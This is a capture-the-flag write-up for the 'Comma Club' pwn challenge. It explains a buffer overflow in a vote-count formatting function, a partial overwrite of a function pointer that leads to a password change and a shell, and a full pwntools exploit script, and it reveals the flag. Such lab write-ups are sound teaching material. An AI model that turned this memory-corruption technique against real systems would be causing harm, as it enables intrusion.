# Challenge description

[link to challange](https://hackthe.vote/challenges#Comma%20Club-12)

"We need somone to run our vote tallying machine, and it needs to be someone trustworthy. Apparently there's some problem if a candidate gets too many votes. Shouldn't be a problem for us in Wyoming though."

# Solution

After inspecting the checksec output, we can see that the binary is not stripped and has all the protections disabled. We can also see that the binary is a 64-bit ELF file.

![checksec](/images/comma/comma_checksec.png)

In program we can add votes for cadidates and check the results. Other fuctionalities are locked with password. After inspecting the binary in IDA we can see that goal is to get to the close voting option ( it executes system("/bin/sh") ).

![ida](/images/comma/comma_goal.png)

When adding votes there is a limit of 584057 votes that we cann add to the candidate. Also when displaying the results, the program checks if the candidate has more than 584057 votes and if so, resets them to 0, but this happens only when we call the function that displays the results.

Candidates are stored in a structure that is innitialized like this:

![candidates](/images/comma/comma_candidate_structure.png)

After experimenting with the program, if we add a lot of votes for a candidate, the program will crash wig SIGSEGV. 

![cand_array](/images/comma/comma_cand_array.png)


Here in debuger we can see how candidates are stored in memory. 
(Name, votes,string representation of votes and poiter to function that displays the results)

Function print_int_with_commas has a buffer overflow vulnerability. We can overwrite the pointer to the function that displays the results. 

![chage_password_function](/images/comma/comma_change_password_function.png)

So we can overwrite last byte of the pointer so it points to change_password_to function. Last byte needs to be 0x39 which is 9 is ASCII. 

Here you can see how the cand_array looks like after overwriting the pointer.

![overwritten_pointer](/images/comma/comma_overflowed.png)

Last step is to determine to what password will be changed. We can see that by inspecting RAX register when we enter function.

![password](/images/comma/comma_new_password.png)

Here is final exploit:

```python
from pwn import *
from binascii import *
PATH = './challenge'
ADDR = 'comma-club.chal.hackthe.vote'
PORT = 1337
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
####
#r = remote(ADDR, PORT)
####
r = process(PATH)
####
# context.terminal = ['wt.exe','wsl.exe']
# r = gdb.debug(args=[elf.path])
###
r.recvuntil(b'> ')
r.sendline(b'1') #add vote option
votes = 1000009
reminder = votes % 584056
reps = votes//584056
for i in range(reps):
    r.recvuntil(b'> ')
    r.sendline(b'1') #select candidate
    r.recvuntil(b'> ')
    r.sendline(b'584056') #add votes
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b'> ')
r.sendline(str(reminder).encode()) #add rest of votes
r.recvuntil(b'> ')
r.sendline(b'3') #quit
r.recvuntil(b'> ')
r.sendline(b'2') #print votes
r.recvuntil(b'> ')
r.sendline(b'3') #end vote
r.recvuntil(b'> ')
r.sendline(b'Total') #password
r.interactive() #shell
```

Also program can be exploited like this:

```

Resetting vote count to 0.

Correct!
Voting is now closed! The winner is Wilfred J Lewis with 0 votes!
This program will now exit.

```

This exploit happend to work also on second part of the challange called comma-club-revenge (this challange could be also exploited by sending null bytes as password to terminate strncpy).

Second flag:
```
flag{W3lc0Me_t0_TH3_gr34t3r_th4N_0n3_c0Mm4_c1Ub}
